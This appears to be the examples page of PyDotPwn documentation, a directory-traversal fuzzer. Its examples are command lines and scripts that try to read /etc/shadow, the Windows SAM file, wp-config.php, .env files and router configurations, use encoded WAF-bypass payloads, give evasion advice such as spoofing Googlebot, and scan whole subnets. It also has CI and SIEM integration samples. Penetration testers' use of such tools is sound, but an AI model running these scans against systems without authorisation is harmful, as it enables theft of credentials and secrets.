---
layout: page
title: "Examples"
permalink: /examples/
---

# 📝 Real-World Examples

This section provides comprehensive examples of using PyDotPwn in real-world security testing scenarios, covering various protocols, environments, and use cases.

## 📋 Table of Contents

- [Web Application Testing](#web-application-testing)
- [Infrastructure Assessment](#infrastructure-assessment)
- [Network Device Testing](#network-device-testing)
- [Custom Protocol Testing](#custom-protocol-testing)
- [Automation and Scripting](#automation-and-scripting)
- [Advanced Scenarios](#advanced-scenarios)
- [Performance Optimization](#performance-optimization)
- [Integration Examples](#integration-examples)

## 🌐 Web Application Testing

### 🆕 Path Validation Bypass - Revolutionary Feature

**Scenario**: Testing modern web applications that validate legitimate path prefixes (NEW EXCLUSIVE FEATURE).

#### Enterprise Web Application Testing
```bash
# Revolutionary: Path validation bypass with 25,000+ patterns
python dotdotpwn.py --module http --host enterprise.com --file /etc/passwd --depth 6
# Generates: /var/www/uploads/../../../../../etc/passwd
#           /var/www/images/../../../../../etc/passwd
#           + 25,000+ more patterns with multi-level encoding

# Windows enterprise application
python dotdotpwn.py --module http --host windows-app.com --file "C:\Windows\System32\drivers\etc\hosts" --depth 4
# Generates: C:\inetpub\wwwroot\uploads\..\..\..\Windows\System32\drivers\etc\hosts
```

#### Advanced WAF Bypass Testing
```bash
# Deep encoding bypass (quintuple URL encoding)
python dotdotpwn.py --module http --host protected.com --file /etc/passwd --depth 3
# Includes patterns like: /var/www/images/%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc/passwd

# Pattern generation for analysis
python dotdotpwn.py main --module stdout --os-type unix --file "/etc/passwd" --depth 3 > patterns.txt
# Generates 25,000+ patterns to file for manual analysis
```

### 🎯 Modern Web Application Scan with Absolute Path Detection

**Scenario**: Testing a web application with comprehensive absolute path detection (ENHANCED FEATURE).

#### CLI Command
```bash
# Enhanced scan with absolute path patterns (144+ patterns per target)
python dotdotpwn.py --module http --host webapp.company.com --file /etc/passwd --pattern "root:" --depth 8

# Generate all patterns (path validation + absolute + relative)
python dotdotpwn.py main --module stdout --os-type unix --file /etc/passwd --depth 5

# Multiple target file aliases supported
python dotdotpwn.py --module http --host webapp.company.com -f /etc/passwd --pattern "root:"
python dotdotpwn.py --module http --host webapp.company.com --target-file /etc/shadow --pattern "root:"
python dotdotpwn.py --module http --host webapp.company.com --specific-file /etc/hosts --depth 6

# Enhanced scan with OS detection
python dotdotpwn.py --module http --host webapp.company.com --ssl --detect-os --service-detection --break-on-first --pattern "root:"
```

### 📊 Pattern Generation Comparison

```bash
# Traditional approach (limited patterns)
# Original DotDotPwn: ~1,778 patterns total
python dotdotpwn.py main --module stdout --os-type unix --file "/etc/passwd" --depth 3 | wc -l
# Output: 25,000+ patterns (1,305% increase)

# Pattern breakdown:
# - Relative traversal: ~1,778 patterns (traditional)
# - Absolute path: ~144 patterns (4,700% increase over original)
# - Path validation bypass: ~25,000 patterns (NEW - not in original)

# NEW: Enhanced approach (with absolute paths)  
python dotdotpwn.py generate --file /etc/passwd --depth 6 --absolute
# Output: 1,922 patterns (7.5% absolute coverage, 144 absolute patterns)
```

#### GUI Configuration
```
Module: http
Target Host: webapp.company.com
Port: 80 (or 443 for SSL)
Target File: /etc/passwd
Pattern: root:
Depth: 8
SSL: Enabled (if HTTPS)
OS Detection: Yes
Service Detection: Yes
Break on First: Yes
```

#### API Request
```bash
curl -X POST "http://localhost:8000/scans" \
  -H "Content-Type: application/json" \
  -d '{
    "module": "http",
    "target": {"host": "webapp.company.com", "port": 443},
    "config": {"file": "/etc/passwd", "pattern": "root:", "depth": 8},
    "options": {"ssl": true, "os_detection": true, "break_on_first": true},
    "auto_start": true
  }'
```

### E-commerce Platform Testing

**Scenario**: Testing an e-commerce platform with common vulnerabilities.

```bash
# Test for configuration files
python dotdotpwn.py --module http --host shop.example.com --file config.php --pattern "mysql_connect" --depth 10 --extra-files

# Test for database connection files
python dotdotpwn.py --module http --host shop.example.com --file wp-config.php --pattern "DB_PASSWORD" --depth 8

# Test Windows-based e-commerce
python dotdotpwn.py --module http --host winshop.example.com --os-type windows --file web.config --pattern "connectionString" --depth 6
```

### 🆕 Cross-Platform Testing Examples

**Scenario**: Comprehensive testing for both UNIX and Windows systems with absolute path detection.

#### UNIX System Testing
```bash
# NEW: Comprehensive UNIX testing with absolute paths
python dotdotpwn.py --module http --host linux.server.com --file /etc/passwd --absolute --depth 6
# Generates patterns like: /etc/passwd, %2fetc%2fpasswd, ../../../etc/passwd

# NEW: Test multiple critical UNIX files
python dotdotpwn.py --module http --host linux.server.com --file /etc/shadow --absolute --pattern "root:"
python dotdotpwn.py --module http --host linux.server.com --file /proc/self/environ --absolute --pattern "PATH"
python dotdotpwn.py --module http --host linux.server.com --file /var/log/auth.log --absolute --pattern "authentication"

# NEW: Generate UNIX patterns for offline analysis
python dotdotpwn.py generate --os-type unix --file /etc/passwd --depth 8 --absolute > unix_patterns.txt
```

#### Windows System Testing  
```bash
# NEW: Comprehensive Windows testing with absolute paths
python dotdotpwn.py --module http --host windows.server.com --file "c:\\windows\\system32\\config\\sam" --absolute --depth 5
# Generates patterns like: c:\windows\system32\config\sam, %2fc%5cwindows%5csystem32%5cconfig%5csam

# NEW: Test critical Windows files
python dotdotpwn.py --module http --host windows.server.com --file "c:\\boot.ini" --absolute --pattern "Windows"
python dotdotpwn.py --module http --host iis.server.com --file "c:\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log" --absolute --pattern "GET"

# NEW: Generate Windows patterns
python dotdotpwn.py generate --os-type windows --file "c:\\windows\\system32\\config\\sam" --depth 6 --absolute > windows_patterns.txt
```

### CMS Vulnerability Testing

**Scenario**: Testing popular Content Management Systems with enhanced absolute path detection.

#### WordPress Testing
```bash
# NEW: WordPress with absolute path detection
python dotdotpwn.py --module http --host wordpress.site.com --file wp-config.php --pattern "DB_PASSWORD" --depth 8 --absolute

# NEW: Using multiple parameter aliases
python dotdotpwn.py --module http --host wordpress.site.com -f wp-config.php --pattern "DB_PASSWORD" --absolute
python dotdotpwn.py --module http --host wordpress.site.com --target-file wp-config.php --pattern "DB_PASSWORD" --absolute  
python dotdotpwn.py --module http --host wordpress.site.com --specific-file wp-config.php --pattern "DB_PASSWORD" --absolute

# WordPress admin files with absolute paths
python dotdotpwn.py --module http --host wordpress.site.com --file wp-admin/setup-config.php --pattern "wp-config" --depth 6 --absolute

# With authentication and absolute paths
python dotdotpwn.py --module http --host wordpress.site.com --username admin --password password123 --file wp-config.php --pattern "DB_" --absolute
```

#### Drupal Testing
```bash
# Drupal settings
python dotdotpwn.py --module http --host drupal.site.com --file sites/default/settings.php --pattern "database" --depth 8

# Drupal configuration
python dotdotpwn.py --module http --host drupal.site.com --file .htaccess --pattern "RewriteEngine" --depth 6
```

### API Endpoint Testing

**Scenario**: Testing REST API endpoints for directory traversal.

```bash
# Test API with custom headers
python dotdotpwn.py --module http --host api.service.com --port 8080 --method POST --user-agent "API-Scanner/1.0" --pattern "database" --file config.json

# Test GraphQL endpoint
python dotdotpwn.py --module http --host api.graphql.com --file schema.graphql --pattern "type Query" --method POST

# Test with API key authentication (if supported by custom headers)
python dotdotpwn.py --module http --host secure-api.com --pattern "secret" --file .env --depth 8
```

### Single Page Application (SPA) Testing

**Scenario**: Testing modern web applications built with React, Angular, or Vue.js.

```bash
# Test build configuration files
python dotdotpwn.py --module http --host spa.example.com --file package.json --pattern "dependencies" --depth 6

# Test environment files
python dotdotpwn.py --module http --host spa.example.com --file .env.production --pattern "API_KEY" --depth 8

# Test source maps
python dotdotpwn.py --module http --host spa.example.com --file main.js.map --pattern "sourceRoot" --depth 4
```

## 🏢 Infrastructure Assessment

### FTP Server Testing

**Scenario**: Assessing FTP servers for directory traversal vulnerabilities.

#### Anonymous FTP Testing
```bash
# Basic anonymous FTP scan
python dotdotpwn.py --module ftp --host ftp.company.com --pattern "confidential" --depth 8

# Test for system files
python dotdotpwn.py --module ftp --host ftp.company.com --file /etc/passwd --pattern "root:" --depth 10

# Test Windows FTP server
python dotdotpwn.py --module ftp --host ftp.windows-server.com --os-type windows --file boot.ini --pattern "Windows" --depth 6
```

#### Authenticated FTP Testing
```bash
# FTP with credentials
python dotdotpwn.py --module ftp --host secure-ftp.company.com --username ftpuser --password ftppass123 --pattern "sensitive" --depth 8

# Test for backup files
python dotdotpwn.py --module ftp --host backup-ftp.company.com --username backup --password backup123 --file database.sql --pattern "INSERT INTO" --depth 6
```

#### FTP Server Assessment Script
```bash
#!/bin/bash
# FTP assessment script

FTP_HOST="ftp.target.com"
TARGETS=("/etc/passwd" "/etc/shadow" "/etc/hosts" "boot.ini" "web.config")
PATTERNS=("root:" "root:" "localhost" "Windows" "connectionString")

for i in "${!TARGETS[@]}"; do
    echo "Testing ${TARGETS[$i]}..."
    python dotdotpwn.py --module ftp --host "$FTP_HOST" --file "${TARGETS[$i]}" --pattern "${PATTERNS[$i]}" --depth 8 --quiet
    sleep 2
done
```

### TFTP Server Testing

**Scenario**: Testing network devices and embedded systems using TFTP.

#### Network Device Configuration
```bash
# Test router configuration
python dotdotpwn.py --module tftp --host 192.168.1.1 --file startup-config --pattern "enable secret" --depth 6

# Test switch configuration
python dotdotpwn.py --module tftp --host 192.168.1.10 --file running-config --pattern "hostname" --depth 4

# Test with custom port
python dotdotpwn.py --module tftp --host device.company.com --port 1069 --file config.txt --pattern "password" --depth 8
```

#### Embedded System Testing
```bash
# Test embedded Linux device
python dotdotpwn.py --module tftp --host 192.168.1.100 --file /etc/passwd --pattern "root:" --os-type unix --depth 8

# Test IoT device configuration
python dotdotpwn.py --module tftp --host iot-device.local --file device.conf --pattern "wifi_password" --depth 6
```

### Network Scanning with Multiple Protocols

**Scenario**: Comprehensive network assessment using multiple protocols.

```bash
#!/bin/bash
# Multi-protocol network assessment

TARGET="192.168.1.100"

echo "=== HTTP Assessment ==="
python dotdotpwn.py --module http --host "$TARGET" --pattern "root:" --depth 8 --quiet

echo "=== HTTPS Assessment ==="
python dotdotpwn.py --module http --host "$TARGET" --ssl --pattern "root:" --depth 8 --quiet

echo "=== FTP Assessment ==="
python dotdotpwn.py --module ftp --host "$TARGET" --pattern "confidential" --depth 6 --quiet

echo "=== TFTP Assessment ==="
python dotdotpwn.py --module tftp --host "$TARGET" --pattern "config" --depth 4 --quiet

echo "Assessment complete!"
```

## 🔧 Network Device Testing

### Router and Switch Testing

**Scenario**: Testing Cisco, Juniper, and other network devices.

#### Cisco Device Testing
```bash
# Test Cisco router via HTTP
python dotdotpwn.py --module http --host 192.168.1.1 --file startup-config --pattern "hostname" --depth 6

# Test via TFTP
python dotdotpwn.py --module tftp --host 192.168.1.1 --file startup-config --pattern "enable secret" --depth 4

# Test with SNMP-based web interface
python dotdotpwn.py --module http --host cisco-router.company.com --port 8080 --pattern "Community" --file snmp.conf --depth 8
```

#### Juniper Device Testing
```bash
# Juniper device configuration
python dotdotpwn.py --module http --host juniper.device.com --file juniper.conf --pattern "root-authentication" --depth 6

# Test via SSH file access (if web interface available)
python dotdotpwn.py --module http --host juniper.device.com --file /var/log/messages --pattern "kernel" --depth 8
```

### Wireless Access Point Testing

**Scenario**: Testing wireless access points and controllers.

```bash
# Test wireless configuration
python dotdotpwn.py --module http --host ap.company.com --file wireless.conf --pattern "passphrase" --depth 6

# Test controller configuration
python dotdotpwn.py --module http --host wlc.company.com --file controller.cfg --pattern "radius-server" --depth 8

# Test with authentication
python dotdotpwn.py --module http --host secure-ap.company.com --username admin --password admin --pattern "ssid" --file config.xml --depth 6
```

### Firewall Testing

**Scenario**: Testing firewall management interfaces.

```bash
# Test firewall web interface
python dotdotpwn.py --module http --host firewall.company.com --file firewall.conf --pattern "access-list" --depth 8

# Test with SSL and authentication
python dotdotpwn.py --module http --host secure-fw.company.com --ssl --username admin --password firewall123 --pattern "policy" --file rules.xml --depth 6
```

## 🔧 Custom Protocol Testing

### Custom Service Testing

**Scenario**: Testing proprietary or custom network services.

#### Custom TCP Service
```bash
# Test custom protocol on port 9999
python dotdotpwn.py --module payload --host custom-service.company.com --port 9999 --payload-file custom_payloads.txt --pattern "access granted" --delay 1.0
```

#### Custom Payload File (`custom_payloads.txt`)
```
GET TRAVERSAL/config.ini HTTP/1.1\r\nHost: custom-service.company.com\r\n\r\n
RETRIEVE TRAVERSAL/database.conf\r\n
LIST TRAVERSAL/\r\n
SHOW TRAVERSAL/system.cfg\r\n
```

#### SSL Custom Service
```bash
# Test custom SSL service
python dotdotpwn.py --module payload --host secure-custom.company.com --port 8443 --ssl --payload-file ssl_payloads.txt --pattern "database" --delay 0.5
```

### Database Interface Testing

**Scenario**: Testing database management interfaces.

```bash
# Test phpMyAdmin
python dotdotpwn.py --module http --host db.company.com --file config.inc.php --pattern "password" --depth 8

# Test SQL Server Management
python dotdotpwn.py --module http --host sqlserver.company.com --port 1433 --file master.mdf --pattern "SA" --os-type windows --depth 6

# Test MongoDB interface
python dotdotpwn.py --module http --host mongo.company.com --port 27017 --pattern "admin" --file admin.js --depth 6
```

### Application Server Testing

**Scenario**: Testing various application servers.

#### Tomcat Server Testing
```bash
# Test Tomcat configuration
python dotdotpwn.py --module http --host tomcat.company.com --port 8080 --file conf/server.xml --pattern "Connector" --depth 8

# Test Tomcat with manager app
python dotdotpwn.py --module http --host tomcat.company.com --port 8080 --username manager --password manager --file conf/tomcat-users.xml --pattern "role" --depth 6
```

#### IIS Testing
```bash
# Test IIS configuration
python dotdotpwn.py --module http --host iis.company.com --file web.config --pattern "connectionString" --os-type windows --depth 8

# Test IIS log files
python dotdotpwn.py --module http --host iis.company.com --file logs/LogFiles/W3SVC1/ex231028.log --pattern "GET" --depth 6
```

## 🤖 Automation and Scripting

### Batch Target Scanning

**Scenario**: Scanning multiple targets from a list.

#### Target List File (`targets.txt`)
```
webapp1.company.com
webapp2.company.com
api.company.com
shop.company.com
blog.company.com
```

#### Batch Scanning Script
```bash
#!/bin/bash
# batch_scan.sh - Scan multiple targets

TARGETS_FILE="targets.txt"
REPORT_DIR="scan_reports_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$REPORT_DIR"

while IFS= read -r target; do
    echo "Scanning $target..."
    
    # Create timestamped report filename
    REPORT_FILE="$REPORT_DIR/${target}_$(date +%H%M%S).json"
    
    # Perform scan
    python dotdotpwn.py --module http --host "$target" \
        --pattern "root:" --depth 8 --break-on-first \
        --report "$REPORT_FILE" --format json --quiet
    
    echo "Report saved: $REPORT_FILE"
    sleep 2  # Rate limiting
    
done < "$TARGETS_FILE"

echo "Batch scanning complete. Reports in: $REPORT_DIR"
```

### CI/CD Pipeline Integration

**Scenario**: Integrating DotDotPwn into continuous integration pipelines.

#### Jenkins Pipeline Example
```groovy
pipeline {
    agent any
    
    stages {
        stage('Security Scan') {
            steps {
                script {
                    // Start DotDotPwn API server
                    sh 'python dotdotpwn.py api --host localhost --port 8000 &'
                    sleep(10)
                    
                    // Perform security scan
                    def scanResult = sh(
                        script: '''
                            curl -X POST "http://localhost:8000/scans" \
                                -H "Content-Type: application/json" \
                                -d '{
                                    "module": "http",
                                    "target": {"host": "staging.example.com"},
                                    "config": {"pattern": "root:", "depth": 8},
                                    "options": {"break_on_first": true},
                                    "auto_start": true
                                }'
                        ''',
                        returnStdout: true
                    )
                    
                    def scanData = readJSON text: scanResult
                    def scanId = scanData.scan_id
                    
                    // Wait for completion
                    timeout(time: 10, unit: 'MINUTES') {
                        waitUntil {
                            def status = sh(
                                script: "curl -s http://localhost:8000/scans/${scanId}",
                                returnStdout: true
                            )
                            def statusData = readJSON text: status
                            return statusData.status == 'completed'
                        }
                    }
                    
                    // Check results
                    def finalResult = sh(
                        script: "curl -s http://localhost:8000/scans/${scanId}",
                        returnStdout: true
                    )
                    def resultData = readJSON text: finalResult
                    
                    if (resultData.results.vulnerabilities_found > 0) {
                        error("Security vulnerabilities found: ${resultData.results.vulnerabilities_found}")
                    }
                }
            }
        }
    }
    
    post {
        always {
            // Stop API server
            sh 'pkill -f "dotdotpwn.py api" || true'
        }
    }
}
```

#### GitHub Actions Workflow
```yaml
name: Security Scan
on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v3
      with:
        python-version: '3.10'
    
    - name: Install DotDotPwn
      run: |
        pip install -r requirements.txt
    
    - name: Start API Server
      run: |
        python dotdotpwn.py api --host localhost --port 8000 &
        sleep 10
    
    - name: Run Security Scan
      run: |
        SCAN_RESPONSE=$(curl -X POST "http://localhost:8000/scans" \
          -H "Content-Type: application/json" \
          -d '{
            "module": "http",
            "target": {"host": "${{ secrets.STAGING_HOST }}"},
            "config": {"pattern": "root:", "depth": 8},
            "options": {"break_on_first": true},
            "auto_start": true
          }')
        
        SCAN_ID=$(echo "$SCAN_RESPONSE" | jq -r '.scan_id')
        echo "SCAN_ID=$SCAN_ID" >> $GITHUB_ENV
        
        # Wait for completion
        while true; do
          STATUS=$(curl -s "http://localhost:8000/scans/$SCAN_ID" | jq -r '.status')
          if [[ "$STATUS" == "completed" ]]; then
            break
          fi
          sleep 10
        done
        
        # Check results
        VULNS=$(curl -s "http://localhost:8000/scans/$SCAN_ID" | jq -r '.results.vulnerabilities_found')
        if [[ "$VULNS" -gt 0 ]]; then
          echo "::error::Security vulnerabilities found: $VULNS"
          exit 1
        fi
    
    - name: Upload Scan Report
      if: always()
      uses: actions/upload-artifact@v3
      with:
        name: security-scan-report
        path: scan_report.json
```

### Monitoring and Alerting

**Scenario**: Continuous monitoring with alerting.

#### Monitoring Script
```bash
#!/bin/bash
# monitor_targets.sh - Continuous monitoring script

TARGETS=("webapp.company.com" "api.company.com" "shop.company.com")
ALERT_EMAIL="security@company.com"
LOG_FILE="/var/log/dotdotpwn_monitor.log"

monitor_target() {
    local target=$1
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] Monitoring $target..." | tee -a "$LOG_FILE"
    
    # Perform scan
    RESULT=$(python dotdotpwn.py --module http --host "$target" \
        --pattern "root:" --depth 8 --break-on-first --quiet \
        --report "/tmp/${target}_scan.json" --format json)
    
    # Check if vulnerabilities found
    if grep -q '"vulnerabilities_found": [1-9]' "/tmp/${target}_scan.json"; then
        echo "[$timestamp] ALERT: Vulnerabilities found on $target" | tee -a "$LOG_FILE"
        
        # Send alert email
        mail -s "Security Alert: $target" "$ALERT_EMAIL" < "/tmp/${target}_scan.json"
        
        # Send Slack notification (if webhook configured)
        if [[ -n "$SLACK_WEBHOOK" ]]; then
            curl -X POST "$SLACK_WEBHOOK" \
                -H 'Content-type: application/json' \
                --data "{\"text\":\"🚨 Security Alert: Vulnerabilities found on $target\"}"
        fi
    else
        echo "[$timestamp] $target: No vulnerabilities detected" | tee -a "$LOG_FILE"
    fi
}

# Monitor targets in rotation
while true; do
    for target in "${TARGETS[@]}"; do
        monitor_target "$target"
        sleep 300  # 5 minute delay between targets
    done
    
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Monitoring cycle complete. Sleeping for 1 hour..." | tee -a "$LOG_FILE"
    sleep 3600  # 1 hour delay between cycles
done
```

## 🎯 Advanced Scenarios

### Stealth and Evasion Testing

**Scenario**: Testing with stealth techniques to avoid detection.

```bash
# Low and slow scanning
python dotdotpwn.py --module http --host target.company.com \
    --delay 5.0 --depth 6 --quiet --continue-on-error \
    --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    --pattern "sensitive"

# Randomized delay scanning
python dotdotpwn.py --module http --host target.company.com \
    --delay 2.0 --depth 8 --quiet \
    --user-agent "Googlebot/2.1 (+http://www.google.com/bot.html)" \
    --pattern "confidential"

# Minimal footprint scanning
python dotdotpwn.py --module http --host target.company.com \
    --break-on-first --delay 3.0 --quiet --depth 4 \
    --pattern "admin"
```

### Load Testing Integration

**Scenario**: Combining security testing with load testing.

```bash
#!/bin/bash
# load_security_test.sh - Combined load and security testing

TARGET="webapp.company.com"
CONCURRENT_SCANS=5

echo "Starting load-based security testing..."

# Function to run individual scan
run_scan() {
    local scan_id=$1
    echo "Starting scan $scan_id..."
    
    python dotdotpwn.py --module http --host "$TARGET" \
        --pattern "root:" --depth 6 --delay 0.1 --quiet \
        --report "scan_${scan_id}.json" --format json
    
    echo "Scan $scan_id completed"
}

# Start concurrent scans
for i in $(seq 1 $CONCURRENT_SCANS); do
    run_scan $i &
done

# Wait for all scans to complete
wait

echo "All scans completed. Analyzing results..."

# Combine results
python << EOF
import json
import glob

all_results = []
for file in glob.glob('scan_*.json'):
    with open(file, 'r') as f:
        data = json.load(f)
        all_results.append(data)

# Analyze combined results
total_vulns = sum(result.get('results', {}).get('vulnerabilities_found', 0) for result in all_results)
total_requests = sum(result.get('results', {}).get('total_requests', 0) for result in all_results)

print(f"Combined Results:")
print(f"Total Vulnerabilities: {total_vulns}")
print(f"Total Requests: {total_requests}")
print(f"Average per scan: {total_requests/len(all_results):.1f}")
EOF
```

### Pattern Generation for External Tools

**Scenario**: Generating patterns for use with other security tools.

```bash
# Generate Unix patterns for Burp Suite
python dotdotpwn.py --module stdout --depth 8 --os-type unix --file /etc/passwd > burp_unix_patterns.txt

# Generate Windows patterns for OWASP ZAP
python dotdotpwn.py --module stdout --depth 6 --os-type windows --file boot.ini --extension .bak > zap_windows_patterns.txt

# Generate generic patterns with custom extensions
python dotdotpwn.py --module stdout --depth 10 --os-type generic --file config.txt --extension .backup > generic_patterns.txt

# Generate and filter patterns
python dotdotpwn.py --module stdout --depth 8 --file database.conf | grep -E '\.\./.*\.\./.*\.\.' | head -50 > filtered_patterns.txt
```

### Integration with Vulnerability Scanners

**Scenario**: Combining DotDotPwn with other vulnerability scanners.

#### Nmap + DotDotPwn Integration
```bash
#!/bin/bash
# nmap_dotdotpwn_integration.sh

TARGET_NETWORK="192.168.1.0/24"

echo "Phase 1: Network discovery with Nmap..."
nmap -sn "$TARGET_NETWORK" | grep "Nmap scan report" | awk '{print $5}' > discovered_hosts.txt

echo "Phase 2: Port scanning web services..."
while IFS= read -r host; do
    echo "Scanning $host for web services..."
    nmap -p 80,443,8080,8443 -sV "$host" | grep "open" > "${host}_ports.txt"
    
    # Extract open web ports
    if grep -q "80/tcp.*open" "${host}_ports.txt"; then
        echo "Testing HTTP on $host..."
        python dotdotpwn.py --module http --host "$host" --port 80 --pattern "root:" --depth 6 --quiet --report "${host}_http.json" --format json
    fi
    
    if grep -q "443/tcp.*open" "${host}_ports.txt"; then
        echo "Testing HTTPS on $host..."
        python dotdotpwn.py --module http --host "$host" --port 443 --ssl --pattern "root:" --depth 6 --quiet --report "${host}_https.json" --format json
    fi
    
done < discovered_hosts.txt

echo "Phase 3: Generating summary report..."
python << EOF
import json
import glob

summary = {"total_hosts": 0, "vulnerable_hosts": 0, "total_vulns": 0}

for report_file in glob.glob("*_http*.json"):
    try:
        with open(report_file, 'r') as f:
            data = json.load(f)
            summary["total_hosts"] += 1
            vulns = data.get("results", {}).get("vulnerabilities_found", 0)
            if vulns > 0:
                summary["vulnerable_hosts"] += 1
                summary["total_vulns"] += vulns
                print(f"VULNERABLE: {report_file} - {vulns} vulnerabilities")
    except:
        pass

print(f"\nSummary:")
print(f"Total hosts scanned: {summary['total_hosts']}")
print(f"Vulnerable hosts: {summary['vulnerable_hosts']}")
print(f"Total vulnerabilities: {summary['total_vulns']}")
EOF
```

## ⚡ Performance Optimization

### High-Speed Scanning

**Scenario**: Optimizing for maximum scan speed.

```bash
# Fast scanning configuration
python dotdotpwn.py --module http --host fast-target.com \
    --delay 0.05 --depth 4 --break-on-first --quiet \
    --continue-on-error --pattern "root:"

# Parallel scanning with GNU parallel
echo "host1.com host2.com host3.com" | tr ' ' '\n' | parallel -j 10 \
    "python dotdotpwn.py --module http --host {} --delay 0.1 --depth 6 --quiet --pattern 'root:' --report {}_result.json --format json"
```

### Resource-Conscious Scanning

**Scenario**: Scanning with limited system resources.

```bash
# Low-resource scanning
python dotdotpwn.py --module http --host target.com \
    --delay 1.0 --depth 4 --quiet --break-on-first \
    --pattern "root:" --continue-on-error

# Memory-efficient batch processing
#!/bin/bash
# Process targets one at a time to minimize memory usage
while IFS= read -r target; do
    echo "Processing $target..."
    python dotdotpwn.py --module http --host "$target" \
        --delay 0.5 --depth 6 --quiet --break-on-first \
        --pattern "root:" --report "${target}.json" --format json
    
    # Clear any temporary files
    find /tmp -name "dotdotpwn_*" -delete 2>/dev/null || true
    sleep 1
done < targets.txt
```

## 🔗 Integration Examples

### Splunk Integration

**Scenario**: Sending scan results to Splunk for analysis.

```bash
#!/bin/bash
# splunk_integration.sh

SPLUNK_HOST="splunk.company.com"
SPLUNK_PORT="8088"
SPLUNK_TOKEN="your-hec-token-here"

# Perform scan
python dotdotpwn.py --module http --host webapp.company.com \
    --pattern "root:" --depth 8 --report scan_results.json --format json

# Send to Splunk
curl -k "https://$SPLUNK_HOST:$SPLUNK_PORT/services/collector" \
    -H "Authorization: Splunk $SPLUNK_TOKEN" \
    -H "Content-Type: application/json" \
    -d @scan_results.json
```

### ELK Stack Integration

**Scenario**: Sending scan data to Elasticsearch via Logstash.

```bash
# logstash_config.conf
input {
  file {
    path => "/var/log/dotdotpwn/*.json"
    start_position => "beginning"
    codec => "json"
  }
}

filter {
  mutate {
    add_field => { "scan_tool" => "dotdotpwn" }
    add_field => { "security_category" => "directory_traversal" }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "security-scans-%{+YYYY.MM.dd}"
  }
}
```

### SIEM Integration

**Scenario**: Integrating with Security Information and Event Management systems.

```python
# siem_integration.py
import json
import requests
from datetime import datetime

def send_to_siem(scan_results, siem_endpoint, api_key):
    """Send scan results to SIEM system"""
    
    # Format for SIEM consumption
    siem_event = {
        "timestamp": datetime.utcnow().isoformat(),
        "event_type": "security_scan",
        "tool": "dotdotpwn",
        "severity": "high" if scan_results.get("results", {}).get("vulnerabilities_found", 0) > 0 else "info",
        "scan_data": scan_results
    }
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    response = requests.post(siem_endpoint, json=siem_event, headers=headers)
    return response.status_code == 200

# Usage
with open('scan_results.json', 'r') as f:
    results = json.load(f)

success = send_to_siem(results, "https://siem.company.com/api/events", "your-api-key")
print(f"SIEM integration: {'Success' if success else 'Failed'}")
```

---

These examples demonstrate real-world usage patterns for PyDotPwn across various scenarios and integration points. For more specific use cases or advanced configurations, refer to the [CLI Reference](cli-reference), [GUI Guide](gui-guide), or [API Documentation](api-documentation).